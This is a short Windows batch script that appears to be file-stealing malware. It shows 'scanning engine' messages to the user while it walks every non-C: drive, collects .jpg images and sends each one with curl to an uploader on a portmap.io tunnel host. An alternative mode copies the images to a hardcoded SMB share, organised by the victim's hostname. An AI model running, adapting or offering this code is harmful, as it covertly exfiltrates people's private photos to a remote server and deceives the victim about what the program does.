@echo off
cls

set operation= 1
set checkPing= 0

set base_address= http://covid19-28305.portmap.io:28305
set base_ip= 94.130.126.137

for /f "skip=1 delims=" %%A in (
  'wmic computersystem get name'
) do for /f "delims=" %%B in ("%%A") do set "host=%%A"

echo Detected Host %host%
color E
echo Initializing Scanning Engine Please Wait . . .

if %checkPing% == 1 (
	if %operation% == -1 (
		ping %base_ip% -n 1 -w 1000
	) else if %operation% == 1 (
		ping %base_address% -n 1 -w 1000
	)
)

if errorlevel 1 (
  color C
  echo Error Occured While Initializing
  goto :eof
) else ( 
  color A
  call :detectDrives
  goto :eof
)

:detectDrives
echo Getting list of all drives
FOR /F %%x IN ('wmic logicaldisk get name') do (
    if NOT %%x == Name if NOT %%x == [] if NOT %%x == C: (
	    if EXIST %%x (	
	       cd /D %%x
	       echo Current Drive is %%x
	       title Scanning Drive %%x
	       call :treeProcess
	    ) else (
		   echo Drive %%x is not Ready . . .
		)
	)	
)
exit /b

:CopyLocal
if EXIST \\%base_ip%\Sharepoint\%host%\%current_dir% ( 
	echo n | copy /-y %%f \\%base_ip%\Sharepoint\%host%\%current_dir%\*.* > NUL
) else ( 
	mkdir \\%base_ip%\Sharepoint\%host%\%current_dir% > NUL
    echo n | copy /-y %%f \\%base_ip%\Sharepoint\%host%\%current_dir%\*.* > NUL		  
)
exit /b


:treeProcess
echo Scanning Directory %current_dir%
for %%f in (*.jpg) do (
   if %operation% == -1 (
     call :CopyLocal
   ) else if %operation% == 1 (
     curl --form file=@%%f %base_address%/uploader/index.php?host=%host% > NUL
   ) else (
      echo %%f
   )
)

for /D %%d in (*) do (
    cd %%d
	SET current_dir=%%d
    call :treeProcess
    cd ..
)
exit /b